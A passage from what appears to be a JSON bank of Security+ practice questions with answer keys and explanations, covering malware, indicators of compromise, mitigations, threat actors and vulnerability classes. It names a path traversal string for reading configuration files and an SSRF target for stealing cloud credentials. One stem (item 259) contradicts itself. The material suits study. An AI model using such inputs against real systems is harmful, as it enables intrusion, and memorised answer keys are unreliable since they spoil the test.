  "exp": "Bloatware is pre-installed, unwanted software that comes bundled with a device. It consumes system resources (CPU, memory, storage) and degrades performance. While not traditionally malicious like viruses or ransomware, bloatware may collect telemetry data and introduce additional attack surface through vulnerable software. Spyware (A) secretly monitors and collects user data with malicious intent. Ransomware (B) encrypts files for ransom. A rootkit (D) hides malware by modifying the OS. Bloatware is sometimes called PUP (Potentially Unwanted Program) or crapware. Mitigation: clean OS installations, enterprise imaging, or removal tools."
 },
 {
  "id": 241,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst notices that a workstation is making DNS queries to unusual domains at regular 30-second intervals, even when the user is not actively browsing. The queries contain encoded data in the subdomain field. A SIEM correlation rule flags this as potential data exfiltration. This behavioral pattern is BEST described as:",
  "opts": [
   "A. An indicator of compromise (IoC)",
   "B. Normal DNS caching behavior",
   "C. An indicator of attack (IoA)",
   "D. A false positive from the SIEM"
  ],
  "correct": 0,
  "exp": "An indicator of compromise (IoC) is observable evidence that a system has been breached. The DNS beaconing pattern (regular intervals, unusual domains, encoded data in subdomains) is a classic IoC indicating command-and-control (C2) communication or data exfiltration via DNS tunneling. An indicator of attack (IoA) (C) focuses on the attacker's intent and techniques in real-time, regardless of whether they succeed — it describes the attack methodology rather than observed artifacts. Normal DNS behavior (B) would not include encoded data in subdomains at fixed intervals. This is not a false positive (D) — the pattern is highly suspicious. IoCs are artifacts; IoAs describe behaviors and intent."
 },
 {
  "id": 242,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security team observes that an attacker is performing network reconnaissance, followed by credential harvesting, then lateral movement — a pattern consistent with an active intrusion in progress. The team focuses on these behavioral patterns rather than specific file hashes or IP addresses. What is the team analyzing?",
  "opts": [
   "A. Indicators of compromise (IoCs)",
   "B. Indicators of attack (IoAs)",
   "C. Vulnerability scan results",
   "D. Compliance audit findings"
  ],
  "correct": 1,
  "exp": "Indicators of attack (IoAs) focus on the attacker's behaviors, techniques, and intent in real-time — the series of actions that constitute an active attack. Reconnaissance → credential harvesting → lateral movement describes a behavioral attack chain. IoCs (A) are specific forensic artifacts (IP addresses, file hashes, domains, registry changes) that evidence a compromise has occurred. Vulnerability scans (C) identify technical weaknesses. Compliance audits (D) measure adherence to standards. The key distinction: IoAs = behaviors and techniques in real-time (proactive); IoCs = artifacts left behind after compromise (reactive). Both are valuable but serve different purposes in threat detection."
 },
 {
  "id": 243,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A user reports that their computer seems to know everything they type. Investigation reveals a hidden process recording all keystrokes and periodically transmitting them to an external server. The captured data includes passwords, emails, and chat messages. What type of malware is responsible?",
  "opts": [
   "A. Rootkit",
   "B. Keylogger",
   "C. Adware",
   "D. Worm"
  ],
  "correct": 1,
  "exp": "A keylogger records all keystrokes on the compromised system and transmits them to the attacker. This captures everything typed: passwords, messages, credit card numbers, and other sensitive data. Keyloggers can be software-based (as in this scenario) or hardware-based (physical devices attached to the keyboard port). A rootkit (A) hides malware by modifying the OS — it could hide a keylogger but is not itself the recording mechanism. Adware (C) displays unwanted advertisements. A worm (D) self-replicates across networks. Keyloggers are often a component of spyware and are used for credential theft, corporate espionage, and surveillance."
 },
 {
  "id": 244,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A forensic analyst discovers malware that has modified the system's boot loader and kernel modules to hide its process from Task Manager, conceal its files from directory listings, and make its network connections invisible to standard monitoring tools. What type of malware is this?",
  "opts": [
   "A. Logic bomb",
   "B. Virus",
   "C. Rootkit",
   "D. Bloatware"
  ],
  "correct": 2,
  "exp": "A rootkit operates at a deep system level (kernel, boot loader, firmware) to hide the presence of other malware from the operating system and security tools. By modifying the boot loader and kernel modules, it intercepts system calls to conceal processes, files, and network connections. A logic bomb (A) triggers on a condition and does not hide itself this way. A virus (B) infects files but does not typically subvert the kernel. Bloatware (D) is unwanted pre-installed software. Rootkits are extremely difficult to detect because they control the very tools used to look for them. Detection requires: offline scanning, boot from trusted media, memory forensics, or integrity checking tools."
 },
 {
  "id": 245,
  "type": "multi",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A security analyst is reviewing indicators of compromise on a potentially infected workstation. Which TWO of the following are indicators that the workstation has been compromised?",
  "opts": [
   "A. The user recently changed their desktop wallpaper",
   "B. Unexpected outbound connections to IP addresses in known malicious ranges",
   "C. The system clock is accurate and synchronized with the NTP server",
   "D. New user accounts that no administrator created have appeared on the system",
   "E. The antivirus software reports that its definitions are up to date"
  ],
  "correct": [
   1,
   3
  ],
  "exp": "Indicators of compromise (IoCs) include: (B) Unexpected outbound connections to known malicious IPs — this suggests C2 communication, data exfiltration, or botnet activity. (D) Unexplained new user accounts — attackers often create backdoor accounts for persistent access. Changing a wallpaper (A) is a normal user action. An accurate system clock (C) and up-to-date antivirus (E) are signs of normal operation, not compromise. Other common IoCs include: unusual DNS queries, modified system files, unexpected scheduled tasks, disabled security tools, unusual process execution, and large data transfers at unusual times."
 },
 {
  "id": 246,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company divides its network into separate segments: one for point-of-sale systems, one for employee workstations, one for guest Wi-Fi, and one for servers. Firewalls between segments enforce strict access control lists. What mitigation technique is this?",
  "opts": [
   "A. Encryption",
   "B. Network segmentation",
   "C. Access control lists only",
   "D. Data masking"
  ],
  "correct": 1,
  "exp": "Network segmentation divides a network into isolated segments with controlled access between them. This limits lateral movement — if an attacker compromises one segment (e.g., guest Wi-Fi), they cannot easily reach other segments (e.g., POS systems or servers). While ACLs (C) are used to enforce segmentation, the overall technique is segmentation — ACLs are the mechanism, not the strategy. Encryption (A) protects data confidentiality but does not isolate network zones. Data masking (D) obscures sensitive data values. Segmentation is a critical mitigation for PCI-DSS compliance (isolating cardholder data environments) and for limiting the blast radius of any breach."
 },
 {
  "id": 247,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A systems administrator configures all servers so that user accounts have only the minimum permissions required to perform their job functions. Database administrators can manage databases but cannot modify firewall rules, and network administrators can manage firewalls but cannot access databases. Which mitigation technique does this implement?",
  "opts": [
   "A. Network segmentation",
   "B. Patch management",
   "C. Least privilege",
   "D. Configuration enforcement"
  ],
  "correct": 2,
  "exp": "Least privilege grants users only the minimum permissions necessary to perform their job duties — nothing more. Database admins get database access but not firewall access; network admins get firewall access but not database access. This limits the damage if any single account is compromised. Network segmentation (A) divides networks into zones. Patch management (B) keeps software updated. Configuration enforcement (D) ensures systems match a defined baseline. Least privilege is a fundamental security principle that reduces the attack surface, limits insider threat damage, and contains breaches. It should be combined with just-in-time access and regular access reviews."
 },
 {
  "id": 248,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "The IT team discovers that a critical vulnerability in the Apache web server was patched by the vendor three months ago, but the company's servers have not been updated. Which mitigation technique has the company failed to implement?",
  "opts": [
   "A. Encryption",
   "B. Monitoring",
   "C. Patching",
   "D. Decommissioning"
  ],
  "correct": 2,
  "exp": "Patching is the process of applying vendor-released updates to fix known vulnerabilities. A three-month delay in applying a critical patch leaves the system exposed to known, publicly documented vulnerabilities — attackers actively scan for unpatched systems. Encryption (A) protects data confidentiality but does not fix software vulnerabilities. Monitoring (B) detects attacks but does not remediate vulnerabilities. Decommissioning (D) removes systems from service entirely. Effective patch management includes: regular vulnerability scanning, prioritized patching based on severity, testing patches before deployment, and defined SLAs for patch application (e.g., critical patches within 72 hours)."
 },
 {
  "id": 249,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company has servers that are no longer needed after migrating to a cloud-based solution. The security team ensures these servers are wiped, removed from the network, documented, and physically destroyed. What mitigation practice is this?",
  "opts": [
   "A. Hardening",
   "B. Decommissioning",
   "C. Segmentation",
   "D. Monitoring"
  ],
  "correct": 1,
  "exp": "Decommissioning is the process of securely retiring systems that are no longer needed. It includes: removing the system from the network, wiping or destroying data, revoking credentials and certificates, updating documentation and asset inventories, and physically disposing of hardware. Hardening (A) strengthens a system's security configuration — the opposite of decommissioning. Segmentation (C) isolates network zones. Monitoring (D) watches for threats. Decommissioning is critical because forgotten, unmonitored systems become easy targets — they often have stale patches, weak credentials, and no security oversight. If a system isn't needed, remove it."
 },
 {
  "id": 250,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security engineer configures a new server by disabling unnecessary services, removing default accounts, applying the latest patches, enabling audit logging, and configuring a host-based firewall. What is this process called?",
  "opts": [
   "A. Decommissioning",
   "B. Monitoring",
   "C. Hardening",
   "D. Segmentation"
  ],
  "correct": 2,
  "exp": "Hardening is the process of reducing a system's attack surface by securing its configuration. Steps include: disabling unnecessary services and ports, removing default accounts and passwords, applying all current patches, enabling logging and auditing, configuring host-based firewalls, implementing file integrity monitoring, and applying security baselines (CIS benchmarks, DISA STIGs). Decommissioning (A) retires unneeded systems. Monitoring (B) watches for threats. Segmentation (D) isolates network zones. Hardening should be performed on every system before deployment to production and maintained through continuous configuration management."
 },
 {
  "id": 251,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company deploys endpoint detection and response (EDR) agents on all workstations and servers. A SIEM aggregates logs from firewalls, servers, and applications. A SOC team monitors alerts 24/7. Which mitigation technique does this represent?",
  "opts": [
   "A. Least privilege",
   "B. Encryption",
   "C. Monitoring",
   "D. Patching"
  ],
  "correct": 2,
  "exp": "Monitoring involves continuous observation of systems, networks, and user activities to detect, alert on, and respond to security events. EDR provides endpoint-level visibility and detection. SIEM provides centralized log aggregation, correlation, and alerting. A 24/7 SOC provides human analysis and response. Together, these form a comprehensive monitoring capability. Least privilege (A) restricts access rights. Encryption (B) protects data confidentiality. Patching (D) fixes known vulnerabilities. Monitoring is a detective and responsive control — it does not prevent attacks directly but enables rapid detection and response to minimize impact."
 },
 {
  "id": 252,
  "type": "multi",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A company is implementing mitigation techniques after a security assessment. Which TWO of the following are examples of access control as a mitigation technique?",
  "opts": [
   "A. Requiring multi-factor authentication for all remote access",
   "B. Encrypting hard drives with BitLocker",
   "C. Installing network intrusion detection sensors",
   "D. Implementing role-based access control (RBAC) so users can only access resources their role requires",
   "E. Running weekly vulnerability scans"
  ],
  "correct": [
   0,
   3
  ],
  "exp": "Access control mitigations include: (A) Multi-factor authentication (MFA) — verifying identity through multiple factors before granting access is a fundamental access control measure. (D) Role-based access control (RBAC) — assigning permissions based on job roles ensures users only access what they need (enforcing least privilege). BitLocker encryption (B) is an encryption mitigation, not access control. Network IDS (C) is a monitoring mitigation. Vulnerability scanning (E) is part of patch management and assessment processes. Access control encompasses all measures that regulate who can access what: authentication, authorization, MFA, RBAC, ACLs, and conditional access policies."
 },
 {
  "id": 253,
  "type": "mcq",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "After discovering that attackers exploited an unencrypted database connection to intercept sensitive data in transit, the security team enforces TLS encryption for all database connections. Which mitigation technique is being applied?",
  "opts": [
   "A. Segmentation",
   "B. Encryption",
   "C. Decommissioning",
   "D. Least privilege"
  ],
  "correct": 1,
  "exp": "Encryption protects data confidentiality by transforming readable data into ciphertext that cannot be read without the proper decryption key. Enforcing TLS for database connections encrypts data in transit, preventing interception (man-in-the-middle attacks). Encryption mitigates risks for data at rest (disk encryption), data in transit (TLS, IPSec), and data in use (secure enclaves). Segmentation (A) isolates network zones but does not protect data content. Decommissioning (C) retires unneeded systems. Least privilege (D) restricts access permissions. Encryption is a corrective action here — applied after the breach to prevent recurrence — and also serves as a preventive control going forward."
 },
 {
  "id": 254,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A group of attackers defaced a government website and posted a manifesto protesting environmental policies. They also leaked internal documents to expose alleged corruption. Their motivation is ideological rather than financial. Which type of threat actor is this?",
  "opts": [
   "A. Nation-state",
   "B. Organized crime",
   "C. Hacktivist",
   "D. Script kiddie"
  ],
  "correct": 2,
  "exp": "Hacktivists are threat actors motivated by political, social, or ideological goals. Website defacement, manifesto posting, and document leaking to promote a cause are hallmark hacktivist activities. Nation-state (A) actors work for governments with geopolitical motivations. Organized crime (B) is financially motivated. Script kiddies (D) use pre-built tools for notoriety and typically lack the sophistication for targeted campaigns. Famous hacktivist groups include Anonymous and LulzSec. Hacktivists often use DDoS attacks, website defacement, and data leaks as tools to draw attention to their cause and embarrass their targets."
 },
 {
  "id": 255,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A recently terminated employee uses credentials that were not properly revoked to access the company's source code repository and delete critical project files. What type of threat actor does this represent?",
  "opts": [
   "A. Nation-state",
   "B. Insider threat",
   "C. Hacktivist",
   "D. Organized crime"
  ],
  "correct": 1,
  "exp": "An insider threat is a current or former employee, contractor, or business partner who has (or recently had) authorized access to organizational resources and uses that access maliciously. The terminated employee still had valid credentials (an offboarding failure) and used them to cause damage. Nation-state (A), hacktivist (C), and organized crime (D) are external threat actors. Insider threats are particularly dangerous because they: have legitimate knowledge of systems and data, may bypass many security controls, have existing credentials, and understand the organization's weaknesses. Mitigation: prompt credential revocation during offboarding, least privilege, and monitoring of departing employee activity."
 },
 {
  "id": 256,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker leaves infected USB drives in the parking lot of a target company, labeled \"Q3 Executive Salary Report.\" An employee picks one up and plugs it into their workstation, triggering a malware installation. Which threat vector was used?",
  "opts": [
   "A. Email-based vector",
   "B. Removable media",
   "C. Vulnerable software",
   "D. Open service ports"
  ],
  "correct": 1,
  "exp": "Removable media (USB drives, CDs, external hard drives) is a threat vector that exploits physical access and human curiosity. The attacker uses social engineering by labeling the drive with enticing content to increase the chance someone will plug it in. This is called a \"USB drop attack\" or \"baiting.\" Email-based (A) would involve phishing messages. Vulnerable software (C) involves exploiting software flaws. Open service ports (D) involve network-accessible services. Removable media attacks bypass network-based security controls entirely because the malware is delivered physically. Mitigation: disable USB ports via group policy, endpoint protection, user training, and device control policies."
 },
 {
  "id": 257,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker creates a fake login page that looks identical to the company's Microsoft 365 portal. The fake page is hosted on a domain that includes \"microsoft\" in the URL. Phishing emails direct employees to this fake page to steal their credentials. This impersonation of a well-known company is called:",
  "opts": [
   "A. Watering hole attack",
   "B. Brand impersonation",
   "C. Pretexting",
   "D. Tailgating"
  ],
  "correct": 1,
  "exp": "Brand impersonation involves creating fake websites, emails, or communications that mimic a well-known, trusted brand (Microsoft, Google, Amazon, a bank) to deceive victims. The fake Microsoft 365 login page with a deceptive URL is textbook brand impersonation. Watering hole (A) compromises a legitimate website the target visits. Pretexting (C) creates a fabricated scenario for social manipulation. Tailgating (D) is physically following someone through a secured entrance. Brand impersonation is effective because users trust familiar brands and may not closely inspect URLs. Mitigation: security awareness training, email filtering, URL analysis, and anti-phishing tools."
 },
 {
  "id": 258,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst receives a phishing email sent to approximately 50,000 employees across the organization. The email uses a generic greeting (\"Dear Customer\"), impersonates a popular streaming service, and contains a malicious link. This broad, untargeted attack is BEST classified as:",
  "opts": [
   "A. Spear phishing",
   "B. Whaling",
   "C. Phishing",
   "D. Vishing"
  ],
  "correct": 2,
  "exp": "Standard phishing is a broad, untargeted social engineering attack sent to a large number of potential victims. The generic greeting, mass distribution, and impersonation of a popular service are hallmarks of basic phishing. Spear phishing (A) is targeted at a specific individual or small group using personalized content. Whaling (B) is spear phishing aimed specifically at senior executives. Vishing (D) uses voice calls. The key differentiator: phishing = broad/untargeted; spear phishing = targeted/personalized; whaling = targeted at C-suite. Each progressively increases in sophistication and personalization."
 },
 {
  "id": 259,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A penetration tester discovers that a web application allows users to inject JavaScript code into their profile \"About Me\" field. When other users view the profile, the JavaScript executes in their browser. However, the injected code is not stored — it is reflected back through a URL parameter. Which type of XSS vulnerability is this?",
  "opts": [
   "A. Stored XSS",
   "B. Reflected XSS",
   "C. DOM-based XSS",
   "D. SQL injection"
  ],
  "correct": 1,
  "exp": "Reflected XSS occurs when malicious input is immediately reflected back by the web server in its response (usually via a URL parameter) without being stored. The attacker crafts a malicious URL that, when clicked by a victim, reflects the script off the server and executes in the victim's browser. Stored XSS (A) persists the malicious script in the server's database. DOM-based XSS (C) occurs entirely in the client-side JavaScript without server involvement. SQL injection (D) targets database queries. Reflected XSS requires the victim to click a malicious link, while stored XSS affects anyone who views the affected page. Both are mitigated by input validation and output encoding."
 },
 {
  "id": 260,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker exploits a vulnerability in a Bluetooth implementation to connect to a victim's smartphone without authentication and access contacts, messages, and files. Which type of vulnerability is this?",
  "opts": [
   "A. Cryptographic vulnerability",
   "B. Bluetooth vulnerability",
   "C. OS-based vulnerability",
   "D. Misconfiguration"
  ],
  "correct": 1,
  "exp": "Bluetooth vulnerabilities include attacks that exploit weaknesses in the Bluetooth protocol or its implementation — such as Bluesnarfing (unauthorized data access), Bluejacking (unsolicited message sending), and Bluebugging (full device control). This scenario describes Bluesnarfing — connecting without authentication to steal data. Cryptographic vulnerabilities (A) involve weak encryption algorithms or protocols. OS-based vulnerabilities (C) are flaws in the operating system itself. Misconfiguration (D) would be a user leaving Bluetooth discoverable, but this exploit targets a flaw in the Bluetooth implementation. Mitigation: keep Bluetooth firmware updated, disable Bluetooth when not in use, use non-discoverable mode."
 },
 {
  "id": 261,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker uses a technique called DLL injection to load a malicious dynamic-link library into the memory space of a running, trusted application. The malicious code then executes with the privileges of the host application. Which vulnerability category does this exploit?",
  "opts": [
   "A. Buffer overflow",
   "B. Memory injection",
   "C. Race condition",
   "D. SQL injection"
  ],
  "correct": 1,
  "exp": "Memory injection involves injecting malicious code into the address space of a running process. DLL injection is a specific technique where the attacker forces a legitimate process to load a malicious DLL, allowing the malicious code to run with the process's privileges and evade detection. Buffer overflow (A) writes beyond allocated memory boundaries — related but distinct from injection. Race conditions (C) exploit timing in concurrent operations. SQL injection (D) targets database queries. Other memory injection techniques include process hollowing, reflective DLL injection, and thread execution hijacking. Memory injection is dangerous because it hides within legitimate, trusted processes."
 },
 {
  "id": 262,
  "type": "multi",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A company wants to reduce its attack surface on production servers. Which TWO of the following are hardening techniques?",
  "opts": [
   "A. Disabling unused services and closing unnecessary ports",
   "B. Installing additional third-party applications for convenience",
   "C. Removing default and guest accounts from all servers",
   "D. Leaving all services in their default configuration for stability",
   "E. Adding more open ports to improve application connectivity"
  ],
  "correct": [
   0,
   2
  ],
  "exp": "Hardening techniques include: (A) Disabling unused services and closing unnecessary ports — every running service and open port is a potential attack vector; removing what isn't needed reduces the attack surface. (C) Removing default and guest accounts — default accounts have well-known credentials and guest accounts provide unauthorized access; removing them eliminates easy entry points. Installing additional applications (B) increases the attack surface. Default configurations (D) are often insecure. More open ports (E) directly increases attack surface. Hardening follows the principle of least functionality — only enable what is explicitly required for the system's designated role."
 },
 {
  "id": 263,
  "type": "multi",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A SOC analyst is training new team members on malware types. Which TWO of the following correctly describe a characteristic that distinguishes the malware type from others?",
  "opts": [
   "A. A virus requires a host file to attach to and user interaction to spread",
   "B. A worm requires the user to click a link to propagate to other systems",
   "C. Ransomware provides the victim with a free decryption key after infection",
   "D. A Trojan disguises itself as legitimate software to trick users into installation",
   "E. Bloatware is designed to encrypt all files on a system for ransom"
  ],
  "correct": [
   0,
   3
  ],
  "exp": "Correct distinctions: (A) Viruses require a host file (they attach to legitimate programs) and typically need user action (opening the file, running the program) to activate and spread — this is what distinguishes them from worms. (D) Trojans disguise themselves as legitimate, useful software — the deception is their defining characteristic. Worms (B) do NOT require user interaction — they self-replicate and spread automatically by exploiting network vulnerabilities. Ransomware (C) demands payment for decryption — it does not provide keys for free. Bloatware (E) is unwanted pre-installed software, not ransomware. Understanding these distinctions is critical for incident identification and response."
 },
 {
  "id": 264,
  "type": "multi",
  "domain": 2,
  "obj": "2.5",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "After a breach investigation reveals that an attacker moved laterally from a compromised workstation to sensitive database servers, which TWO mitigation techniques would MOST effectively prevent this type of lateral movement in the future?",
  "opts": [
   "A. Encrypting data at rest on the database servers",
   "B. Implementing network segmentation between workstations and database servers",
   "C. Conducting annual security awareness training",
   "D. Enforcing strict access controls so workstations cannot directly communicate with database servers",
   "E. Increasing the password complexity requirements"
  ],
  "correct": [
   1,
   3
  ],
  "exp": "Preventing lateral movement requires: (B) Network segmentation — placing workstations and database servers in separate network segments with firewall rules between them prevents direct communication. If the workstation segment is compromised, the attacker cannot reach the database segment directly. (D) Access controls restricting workstation-to-database communication — even within or between segments, enforcing rules that only authorized application servers (not user workstations) can connect to databases implements least privilege at the network level. Encryption at rest (A) protects stored data but does not prevent network movement. Awareness training (C) helps prevent initial compromise but not lateral movement. Password complexity (E) does not address network communication paths."
 },
 {
  "id": 316,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A finance employee receives a video call from the CFO requesting an emergency wire transfer. The employee later discovers the video and voice were generated by an AI model using photos and audio from social media. Which attack is this?",
  "opts": [
   "A. Smishing",
   "B. Deepfake / AI-driven social engineering",
   "C. Typosquatting",
   "D. Watering hole"
  ],
  "correct": 1,
  "exp": "Deepfakes use artificial intelligence to create convincing video and audio impersonations. This is a rapidly growing part of modern social engineering (vishing/whaling) mentioned in the SY0-701 objectives."
 },
 {
  "id": 317,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker tricks a cloud-based server into making a request to an internal metadata service (169.254.169.254) to steal temporary credentials. Which vulnerability is being exploited?",
  "opts": [
   "A. Cross-site scripting (XSS)",
   "B. SQL injection",
   "C. Server-Side Request Forgery (SSRF)",
   "D. Buffer overflow"
  ],
  "correct": 2,
  "exp": "SSRF occurs when an attacker forces a server to make requests to internal or external resources it shouldn't. In cloud environments, targeting the metadata service (169.254.169.254) to steal IAM role credentials is a common and high-impact SSRF attack."
 },
 {
  "id": 318,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst finds that a malware sample has added a new entry under <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>. What is the malware trying to achieve?",
  "opts": [
   "A. Privilege escalation",
   "B. Persistence",
   "C. Data exfiltration",
   "D. Resource exhaustion"
  ],
  "correct": 1,
  "exp": "Registry 'Run' and 'RunOnce' keys are classic persistence mechanisms. They tell Windows to automatically execute a specific program when the user logs in, allowing the malware to survive a system reboot."
 },
 {
  "id": 319,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An organization wants to run suspicious files in a restricted, isolated environment to observe their behavior without risking the host system or network. Which mitigation technique is this?",
  "opts": [
   "A. Hardening",
   "B. Sandboxing",
   "C. Patching",
   "D. Encryption"
  ],
  "correct": 1,
  "exp": "Sandboxing provides an isolated environment (virtual machine or container) where code can be executed safely for testing and analysis. This is commonly used in malware analysis and by email gateways to test attachments."
 },
 {
  "id": 320,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "Which threat actor is most likely to prioritize the disruption of a nation's power grid over financial gain?",
  "opts": [
   "A. Organized Crime",
   "B. Script Kiddie",
   "C. Nation-State / APT",
   "D. Insider Threat"
  ],
  "correct": 2,
  "exp": "Nation-state actors (and Advanced Persistent Threats - APTs) often have geopolitical motivations, including sabotage and disruption of critical infrastructure. Organized crime (A) is almost always motivated by profit (money)."
 },
 {
  "id": 346,
  "obj": "2.1",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A group of attackers has been monitoring a company's financial transactions for several months without being detected. They have used custom-built malware and have successfully moved between various internal systems. Which threat actor type is this?",
  "opts": [
   "A. Script Kiddie",
   "B. Hacktivist",
   "C. Advanced Persistent Threat (APT)",
   "D. Insider Threat"
  ],
  "correct": 2,
  "exp": "APTs are characterized by their high level of sophistication, custom tools, and most importantly, their persistence (staying in a network for a long time) to achieve a long-term goal, such as data theft or espionage."
 },
 {
  "id": 347,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker calls a customer service representative and claims to be a user who is locked out of their account just before a critical project deadline. The attacker sounds very stressed and frustrated. Which social engineering principle is being used?",
  "opts": [
   "A. Scarcity",
   "B. Consensus",
   "C. Urgency",
   "D. Familiarity"
  ],
  "correct": 2,
  "exp": "Urgency is a principle where the attacker creates a high-pressure situation (the project deadline) to force the victim to skip security procedures and act quickly without thinking."
 },
 {
  "id": 348,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security scanner finds a vulnerability in a web application where an attacker can submit a very long string of data into a small text box, causing the application to crash and reveal system information. Which vulnerability is this?",
  "opts": [
   "A. Buffer Overflow",
   "B. SQL Injection",
   "C. Broken Authentication",
   "D. Directory Traversal"
  ],
  "correct": 0,
  "exp": "A buffer overflow occurs when more data is written to a memory block (buffer) than it can hold, leading to system crashes or the execution of malicious code."
 },
 {
  "id": 349,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An administrator sees a sudden spike in outbound traffic on port 6667 (IRC) from a server that normally only handles web traffic. What is the MOST likely cause?",
  "opts": [
   "A. The server is part of a botnet and is communicating with a C2 server",
   "B. A user is legitimately using a chat application on the server",
   "C. The server is performing a routine backup",
   "D. A DNS amplification attack is targeting the server"
  ],
  "correct": 0,
  "exp": "IRC (Internet Relay Chat) is a classic protocol used by botnets for Command and Control (C2). Unauthorized IRC traffic is a major Indicator of Compromise (IoC)."
 },
 {
  "id": 350,
  "obj": "2.5",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "Which of the following would be the MOST effective mitigation against a Pass-the-Hash (PtH) attack?",
  "opts": [
   "A. Enforcing complex passwords",
   "B. Disabling NTLM and using Kerberos with Credential Guard",
   "C. Implementing annual awareness training",
   "D. Using disk encryption"
  ],
  "correct": 1,
  "exp": "Pass-the-Hash attacks rely on capturing NTLM hashes. Disabling NTLM in favor of Kerberos and using Windows Credential Guard (which isolates hashes in memory) are direct mitigations."
 },
 {
  "id": 351,
  "obj": "2.2",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker leaves a dozen USB flash drives in the employee breakroom of a target company. Each drive is labeled 'Company Salaries Q4'. Which attack is being attempted?",
  "opts": [
   "A. Phishing",
   "B. Watering hole",
   "C. Baiting",
   "D. Vishing"
  ],
  "correct": 2,
  "exp": "Baiting involves leaving a physical object (like a USB drive) in a location where a victim will find it and plug it in out of curiosity or greed."
 },
 {
  "id": 352,
  "obj": "2.3",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A vulnerability exists where an attacker can access sensitive configuration files by appending <code>../../etc/config</code> to a web URL. What is this vulnerability?",
  "opts": [
   "A. SQL Injection",
   "B. Directory Traversal",
   "C. Server-Side Request Forgery",
   "D. Cross-Site Scripting"
  ],
  "correct": 1,
  "exp": "Directory traversal (or path traversal) uses the <code>../</code> sequence to navigate the server's file system outside of the intended web root directory."
 },
 {
  "id": 353,
  "obj": "2.4",
  "type": "mcq",
  "domain": 2,
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst finds a file on a Linux server named <code>.hidden_data</code> that contains encrypted records of user keystrokes. Which type of malware created this?",
  "opts": [
   "A. Worm",
   "B. Trojan / Keylogger",
   "C. Ransomware",
   "D. Logic Bomb"
  ],
  "correct": 1,
